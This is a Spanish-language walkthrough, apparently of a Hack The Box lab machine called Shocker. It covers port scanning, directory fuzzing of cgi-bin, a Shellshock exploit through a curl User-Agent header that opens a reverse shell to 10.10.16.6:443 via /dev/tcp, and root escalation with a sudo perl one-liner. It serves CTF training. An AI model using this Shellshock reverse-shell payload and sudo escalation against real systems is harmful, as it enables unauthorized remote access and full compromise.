
# 🕵️‍♂️Reconocimiento

Para empezar, vamos a ver si la maquina esta activa, y en base al ttl que nos de, podemos estimar si es una maquina, linux o windows
![[Shocker3.png]]
En este caso como el ttl es cercano a 64, es una maquina linux

Comenzamos con el escaneo de puertos utilizando `nmap`: 
```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.56 -oG allports
```

![[Shocker1.png]]
En base a los resultados, sabemos que el puerto 80 y el 2222 estan abiertos, asi que vamos a realizar un escaneo exhaustivo, sobre los puertos 2222 y 80
```shell
nmap -sCV -p80,2222 10.10.10.56 -oN target
```

![[Shocker2.png]]
Ahora pudimos identificar que en el puerto 80 corre un servicio de apache y en el 2222 un servicio ssh

-------------
# 🌐Enumeracion
Al ver el servicio apache en puerto 80. Usamos la herramienta `whatweb` para identificar las tecnologías que corren en la pagina
```
whatweb http://10.10.10.56
```
![[Shocker4.png]]
Nos confirma que en el puerto 80 esta corriendo un servicio apache y no nos da ninguna información extra relevante

### Enumeracion con Ffuf
```shell
ffuf -u http://10.10.10.56/FUZZ/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```
![[Shocker5.png]]
Nos da que existe un directorio http://10.10.10.56/cgi-bin/

Ahora aplicamos enumeracion en este directorio buscando archivos  con extension   ``.sh .pl .cgi`` 
```shell
ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -e .sh,.pl,.cgi
```
![[Shocker6.png]]

Y da que en el directorio cgi-bin hay un archivo user.sh   `http://10.10.10.56/cgi-bin/user.sh`
Como estamos ante el directorio cgi-bin, ejecutamos un comando de enumaracion de shellshock de `nmap`:
```shell
nmap -p80 10.10.10.56 --script http-shellshock --script-args uri=/cgi-bin/user.sh
```
Dice que es vulnerable a shellshock, asi que ahora vamos a explotarlo
![[Shocker7.png]]
# 🖫 ShellShock 
[Articulo de shellshock](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html)
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.16.6/443 0>&1"
	aca no se usa el %26 para el & por que estamos dentro de bash y no se va a decodificar
	se pone el ;echo;echo para separar el payload malioso del comando
Esto va a ejecutar una revershell, nos podnemos en escucha por el puerto 443 y ganamos acceso a la maquina

![[Shocker8.png]]

# 🪟Tratamiento de la tty
Una vez dentro de la maquina vamos a hacer un tratamiento de la tty, para que nos ande bien el CTRL+C. CTRL +L y mas funciones
```bash
script  /dev/null -c bash
CTRL+Z
stty raw -echo;fg
reset xterm
export SHELL=bash
export TERM=xterm
stty rows 37 columns 174 //Ajusta las dimensiones del terminal
```

# Flag de intrusion
Ejecuto el comando `ls` para buscar la flag, no esta en el directorio actual y como no esta busco con find
```
find / -name user.txt 2>/dev/null
//Da como resultado /home/shelly/user.txt
cat /home/shelly/user.txt
```

![[Shocker9.png]]


# Escalada de privilegios
Ejecuto el comando
```shell
sudo -l
```

![[Shocker10.png]]
Se puede ejecutar el binario de perl, con privilegio de root sin contraseña. 
Asi que vamos a la pagina de [gtfobins](https://gtfobins.github.io/gtfobins/perl/#sudo) y nos da un comando para ejecutar una bash con privilegios
```bash
sudo perl -e 'exec "/bin/sh";'
```

![[Shocker11.png]]
Y como se puede apreciar, ya somos root, buscamos el archivo root.txt que contiene la flag y lo cateamos

# 🧠 Notas

## Extensiones .sh .pl. cgi
**.sh** El lenguaje es bash  
**.pl** Lenguaje Perl  
**.cgi** Common Gateway Interface Script

*¿Dónde se usan los archivos .cgi?*

- En servidores antiguos o simples que no usan PHP, Node.js, etc.
- En aplicaciones legacy que usan Perl o Bash.
- En entornos educativos o demostrativos.

# 📚Creditos

[Writeup de Bast1an1c](https://bast1ant1c.github.io/shocker/#)  
Writeup oficial de HTB
